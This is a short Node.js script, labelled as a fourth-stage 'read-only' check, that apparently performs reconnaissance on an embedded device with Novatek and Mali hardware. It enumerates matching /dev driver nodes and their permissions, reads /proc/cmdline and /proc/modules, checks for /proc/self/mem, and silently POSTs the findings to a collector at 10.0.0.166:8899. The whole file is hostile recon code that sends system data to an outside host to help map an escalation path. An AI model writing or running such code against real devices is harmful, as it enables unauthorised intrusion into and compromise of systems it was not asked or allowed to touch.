// Stage-4 read-only: check NTK device exposure + RAM layout.
var fs = require('fs');
var http = require('http');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon4', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
var out = {};
try {
  out.ntk = fs.readdirSync('/dev').filter(function (n) { return /ntk|sdp|fdet|mali|ntkxdma/.test(n); }).map(function (n) {
    var s = fs.statSync('/dev/' + n);
    return n + ' mode=' + s.mode.toString(8);
  });
} catch (e) { out.ntk = 'ERR ' + e.message; }
try { out.cmdline = fs.readFileSync('/proc/cmdline', 'utf8'); } catch (e) { out.cmdline = 'ERR'; }
try { out.modules = fs.readFileSync('/proc/modules', 'utf8').split('\n').filter(function (l) { return /ntk|sdp|mali/.test(l); }); } catch (e) { out.modules = 'ERR'; }
try { out.selfmem = fs.statSync('/proc/self/mem') ? 'present' : 'no'; } catch (e) { out.selfmem = 'ERR'; }
post(out);
